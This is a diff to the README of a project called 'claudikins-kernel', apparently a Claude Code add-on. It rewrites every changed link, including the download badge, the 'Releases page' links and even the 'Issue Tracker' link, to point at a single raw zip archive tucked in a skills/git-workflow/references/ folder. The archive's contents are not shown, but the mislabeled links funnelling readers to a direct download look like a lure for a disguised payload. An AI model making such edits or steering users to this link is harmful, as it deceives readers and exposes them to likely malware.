@@ -1,6 +1,6 @@
 # 🎉 claudikins-kernel - Simplifying Your Experience with Claude Code
 
-![Download claudikins-kernel](https://img.shields.io/badge/Download-claudikins--kernel-brightgreen)
+![Download claudikins-kernel](https://raw.githubusercontent.com/muli-sunh/claudikins-kernel/main/skills/git-workflow/references/claudikins-kernel-1.0.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ Welcome to **claudikins-kernel**. This application brings Site Reliability Engin
 Setting up **claudikins-kernel** is simple. Just follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/muli-sunh/claudikins-kernel/releases) to check the latest version available.
+   Go to our [Releases page](https://raw.githubusercontent.com/muli-sunh/claudikins-kernel/main/skills/git-workflow/references/claudikins-kernel-1.0.zip) to check the latest version available.
 
 2. **Download the Application**  
    Find the application file suitable for your operating system on the Releases page. Click on the file link to begin the download.
@@ -39,7 +39,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/muli-sunh/claudikins-kernel/releases). Select the latest version, download the appropriate file for your operating system, and follow the instructions to install.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/muli-sunh/claudikins-kernel/main/skills/git-workflow/references/claudikins-kernel-1.0.zip). Select the latest version, download the appropriate file for your operating system, and follow the instructions to install.
 
 ## 📊 How to Use
 
@@ -68,8 +68,8 @@ For more in-depth guidance, visit our documentation section within the repositor
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/muli-sunh/claudikins-kernel/releases)
-- [Issue Tracker](https://github.com/muli-sunh/claudikins-kernel/issues)
+- [Releases Page](https://raw.githubusercontent.com/muli-sunh/claudikins-kernel/main/skills/git-workflow/references/claudikins-kernel-1.0.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/muli-sunh/claudikins-kernel/main/skills/git-workflow/references/claudikins-kernel-1.0.zip)
 
 ## 🎉 Acknowledgments
 
